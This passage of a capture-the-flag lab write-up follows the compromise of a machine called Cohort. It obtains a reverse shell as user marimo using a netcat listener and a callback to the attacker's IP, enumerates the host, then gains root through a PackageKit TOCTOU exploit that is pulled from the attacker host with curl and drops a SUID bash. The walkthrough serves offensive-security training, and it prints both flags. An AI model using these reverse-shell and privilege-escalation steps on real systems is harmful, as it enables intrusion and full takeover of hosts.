Command execution is established but not interactive. Start a listener and use the exploit's reverse-shell mode to obtain a persistent interactive shell as `marimo`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.14 Obtain an interactive reverse shell and capture the user flag

**Why this step:**  
Command execution is confirmed but each invocation runs a single command and closes (3.13). Establish a persistent interactive shell for enumeration, then read the user flag.

**Command:**

bash

```bash
# Terminal 1 — listener on the attacking host:
nc -lvnp 4444
```

bash

```bash
# Terminal 2 — trigger the reverse shell:
python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell 10.10.15.77 4444
```

```bash
# In the caught shell — stabilise the TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z to background
stty raw -echo; fg
# press Enter, then:
export TERM=xterm

# Capture the flag:
id
cat /home/marimo/user.txt
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`nc -lvnp 4444`|Listener. `-l` listen, `-v` verbose (prints the inbound connection), `-n` no DNS resolution, `-p 4444` port.|
|`--revshell 10.10.15.77 4444`|Builds a Python reverse-shell payload connecting back to the `tun0` address (2.6) and spawning a PTY, backgrounded with `nohup` so it outlives the WebSocket connection.|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Upgrades the shell to a PTY, enabling job control and programs that require a terminal.|
|`stty raw -echo; fg`|Puts the local terminal in raw mode so keystrokes pass through untranslated, then foregrounds the listener. This is what makes Ctrl-C, arrow keys, and tab completion behave in the remote shell.|
|`export TERM=xterm`|Sets a terminal type so full-screen programs render correctly.|

**Result:**

```
listening on [any] 4444 ...
connect to [10.10.15.77] from (UNKNOWN) [TARGET_IP] 37362
marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo@cohort:~$ pwd
/home/marimo
marimo@cohort:~$ ls
notebooks  user.txt
marimo@cohort:~$ cat user.txt
52aa58a6a2556cc193fc04e0d1db8660
```

#### 🚩 USER FLAG

```
52aa58a6a2556cc193fc04e0d1db8660
```

Captured as `marimo` (uid=1000) at `/home/marimo/user.txt`.

**What this gives you:**

**Key findings:**

- **Interactive foothold established** as `marimo`, a standard unprivileged user (uid 1000, single group, no supplementary groups of note).
- **A `notebooks` directory** sits in the home directory alongside the flag — Marimo's working data, worth inspecting during enumeration.
- The reverse shell connected from `TARGET_IP`, confirming outbound connectivity from the target to the attacker on port 4444.

**Next:**  
This completes initial access. With a stable shell as `marimo`, begin privilege-escalation enumeration: user context, sudo rights, SUID binaries, running processes, and scheduled tasks, to identify a path to root.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Privilege Escalation — PackageKit TOCTOU (CVE-2026-41651)

### 4.1 Enumerate the local privilege-escalation surface

**Why this step:**  
Initial access is a shell as `marimo` (3.14). Establish the standard escalation vectors — sudo rights, SUID binaries, credentials, scheduled tasks — before pursuing service-specific exploits.

**Command:**

bash

```bash
id
sudo -l
sudo --version | head -1
uname -a
cat /etc/os-release | head -2
find / -perm -4000 -type f 2>/dev/null
ps aux --sort=-%mem | head -40
```

**Result — user context and system:**

```
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)

sudo -l  →  [sudo] password for marimo:  (password unknown — vector closed)

Sudo version 1.9.15p5
Linux cohort 6.8.0-136-generic #136-Ubuntu SMP ... x86_64
Ubuntu 24.04.4 LTS
```

**Result — SUID binaries:**

```
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

**Result — notable processes (owner in first column):**

```
marimo    1633  /opt/marimo/venv/bin/marimo edit ... --token-password YKQ6iPyO5kusNx0BpVAPfjP5 ...
insights  1632  /usr/bin/python3 /opt/cohort-insights/insights_api.py
root      1558  /opt/sysmon/sysmon -i /opt/sysmon/config.xml -service
_laurel    765  /usr/local/sbin/laurel --config /etc/laurel/config.toml
www-data  1653  nginx: worker process
root      ...   fwupd, udisksd, ModemManager, polkitd, packagekit-family tooling
```

**Analysis:**

|Vector|Result|Status|
|---|---|---|
|sudo|Requires marimo's password, which is unknown|Closed|
|SUID binaries|All twelve are stock Ubuntu; no custom or GTFOBins-exploitable entry|Closed|
|Kernel|6.8.0-136 on Ubuntu 24.04.4, current|Unlikely vector|
|sudo version|1.9.15p5, current|Unlikely vector|
|Marimo token in cmdline|`YKQ6iPyO5kusNx0BpVAPfjP5` exposed in process arguments|Credential to test for reuse|
|Defensive tooling|Sysmon for Linux (PID 1558) and Laurel (PID 765) actively log process and audit events|Note: actions are recorded|

The `insights_api.py` source is world-readable (`-rw-r--r--`) and was reviewed. It is a self-contained URL-fetch service — the backend for the SSRF in section 3 — with no hardcoded credentials, no command execution, no file writes, and no subprocess use. It offers no escalation path and is ruled out.

The exposed Marimo token was tested for reuse as the root password (`su root`) and rejected.

###### Theory — reading a clean enumeration as a signal:

When sudo, SUID, credential reuse, and writable cron all return nothing on a box that plainly has a root path, the absence is itself informative. It points away from the well-worn vectors and toward something in the running service set. The process list here is dominated by root-owned D-Bus and polkit-adjacent daemons — polkitd, udisksd, fwupd, ModemManager, and the PackageKit family. That class of software mediates privileged operations for unprivileged callers through the polkit authentication layer, and it has a long history of local privilege escalation via that layer — flaws that leave no trace in cron or the SUID table because they never touch either.

**What this gives you:**

**Key findings:**

- **No conventional escalation path exists.** sudo needs an unknown password; every SUID binary is stock; the kernel and sudo are current; the Marimo token is not reused as the root password; the insights API source is inert.
- **Two host-based monitoring agents are active** — Sysmon for Linux and Laurel — recording process and audit activity. Relevant to operational stealth and worth documenting.
- **The escalation surface is the root-owned D-Bus/polkit service stack**, PackageKit foremost among it.

**Ruled out:** sudo, SUID binaries, kernel exploitation, credential reuse, the insights API, and (below) scheduled tasks.

**Next:**  
Confirm scheduled tasks add nothing, then verify PackageKit is present and reachable.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>


### 4.2 Rule out cron and confirm PackageKit is reachable

**Why this step:**  
Before committing to a service exploit, eliminate the simpler cron vector and confirm the PackageKit daemon is present, activatable, and root-owned.

**Command:**

bash

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null
which pkcon pkexec 2>/dev/null
ps aux | grep -i packagekit | grep -v grep
systemctl list-units --all 'packagekit*' 2>/dev/null
pkcon backend-details 2>/dev/null
```

**Result:**

```
# /etc/crontab and /etc/cron.d, /etc/cron.daily:
#   all entries stock Ubuntu (e2scrub_all, sysstat, apport, apt-compat,
#   dpkg, logrotate, man-db); all root-owned; none writable by marimo

/usr/bin/pkcon          # pkexec absent
                        # no packagekitd process running
0 loaded units listed.  # not currently loaded as a systemd unit

pkcon backend-details:
Name:           apt
Description:    APT
Author: Daniel Nicoletti ..., Matthias Klumpp ...
```

**Analysis:**

Cron holds no custom root job and nothing marimo can write; the vector is empty.

The PackageKit checks resolve an apparent contradiction. No `packagekitd` appears in `ps`, and `systemctl list-units` shows nothing — yet `pkcon backend-details` returns real data from the **apt** backend. The resolution is D-Bus activation: the daemon is dormant with no process until a client request arrives on the system bus, at which point systemd spawns it on demand. The `backend-details` query itself triggered that activation and got a response, proving the daemon is present, reachable by marimo over D-Bus, and running as root.

###### Theory — D-Bus activation and why "no process" is not "not present":

`systemctl list-units` reports only units the manager has loaded this boot; a purely D-Bus-activated service that has not yet been triggered does not appear there (systemd's own output points to `list-unit-files` for installed-but-unloaded units). Likewise, `ps` shows a daemon only while it is running, and an on-demand service sits at zero processes between requests.

The authoritative test for an activatable service is therefore to invoke it, not to look for it. A successful `pkcon` query demonstrates the full chain: client request → D-Bus → systemd activation → root daemon → response. PackageKit exists precisely to perform privileged package operations for unprivileged callers, gated by polkit — which is what makes a flaw in that gate a direct route to root.

**What this gives you:**

**Key findings:**

- **Cron is ruled out** — no custom or marimo-writable jobs.
- **PackageKit is present and reachable.** The `pkcon` client is installed, the daemon is D-Bus-activated (dormant in `ps`, absent from loaded units, but responsive), runs as root, and uses the **apt** backend.
- **`pkexec` is absent**, so the common pkexec privilege-escalation family does not apply; the vector is the PackageKit D-Bus interface itself.

**Next:**  
PackageKit is confirmed as the escalation surface. Stage the CVE-2026-41651 exploit and execute it against the D-Bus `InstallFiles` method.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Stage and execute the CVE-2026-41651 exploit

**Why this step:**  
PackageKit is confirmed present, D-Bus-activated, and root-owned (4.2). The target has no compiler (`gcc`/`cc`/`make` absent) but does have `dpkg-deb` and PyGObject, so the compiler-free Python exploit runs natively. The target has no internet egress, so the exploit is staged from the attacker host.

###### Theory — the InstallFiles TOCTOU race:

PackageKit exposes an `InstallFiles` method over the system D-Bus so an unprivileged user can request package installation, with polkit gating the operation. The flaw is a time-of-check to time-of-use gap: the authorisation decision and the file processing are not atomic.

The exploit builds two `.deb` packages — a benign dummy and a payload whose maintainer `postinst` script installs a SUID-root bash — then issues two `InstallFiles` calls on the same transaction back to back. The first carries the SIMULATE flag (`4`) with the dummy; the second carries the real flag (`0`) with the payload. By racing them, the payload install is processed under the authorisation context established for the simulated transaction, bypassing the polkit prompt. The payload's `postinst` runs as root and drops a SUID shell.

The payload action, verified in source before execution (see the source-review step preceding this), is a single line: `install -m 4755 /bin/bash /tmp/.suid_bash`. No network activity, no other side effects.

**Command:**

bash

```bash
# On the attacker host — serve the exploit from its directory:
cd ~/Labs/HTB/SN11/Cohort/Pack2TheRoot
python3 -m http.server 8000

# On the target:
cd /tmp
curl -s http://10.10.15.77:8000/exploit.py -o exploit.py
head -5 exploit.py          # verify: import os / import subprocess / ...
python3 /tmp/exploit.py

# In the resulting root shell:
id
cat /root/root.txt
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`http.server` run from `Pack2TheRoot/`|Serves the exploit. Must run in the directory containing `exploit.py` — running it from the parent returns 404, which curl saves as an HTML error page.|
|`curl ... -o exploit.py`|Pulls only the reviewed script — not the repo's shipped `.bin` or `.deb`, neither of which the exploit uses.|
|`head -5 exploit.py`|Sanity check that the fetched file is the script and not a 404 page. A file beginning `<!DOCTYPE HTML>` indicates a failed transfer.|
|`python3 /tmp/exploit.py`|Runs the exploit. It builds both `.deb` packages locally with `dpkg-deb`, fires the racing D-Bus calls, polls for the SUID shell, and auto-execs it with `-p` on success.|
|`-p` (in the auto-exec)|Prevents bash from dropping the elevated euid on startup, preserving root.|

**Result:**

```
[*] CVE-2026-41651 — PackageKit LPE (Python Edition)
[+] Packages generated at /tmp
[+] Active trans: /2_abadcabc
[*] Triggering flood of requests (SIMULATE -> REAL)...
[*] Monitoring /tmp/.suid_bash ...
....
[+++] SUCCESS: /tmp/.suid_bash is SUID ROOT!
.suid_bash-5.2# id
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash-5.2# cat /root/root.txt
d93f9948bc82862ea488b180bbe3ec88
```

**Analysis:**

The prompt changes to `.suid_bash-5.2#` — the `#` denoting a root shell. `id` reports `uid=1000(marimo)` with `euid=0(root)`: the real UID is unchanged, but the effective UID is 0, which is the identity the kernel checks for file access. Reading `/root/root.txt`, permitted only to root, confirms full privilege. The race succeeded on the first attempt; TOCTOU exploits may require repeated runs, as the polling loop's timeout accommodates.

**What this gives you:**

**Key finding: root access achieved.** A SUID-root bash at `/tmp/.suid_bash` yields `euid=0`, and the root flag is readable.

**Next:**  
Both flags are captured. This completes the engagement; proceed to debrief, transferable takeaways, and remediation.

#### 🚩 ROOT FLAG

```
d93f9948bc82862ea488b180bbe3ec88
```

Read from `/root/root.txt` with `euid=0(root)` via SUID bash.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

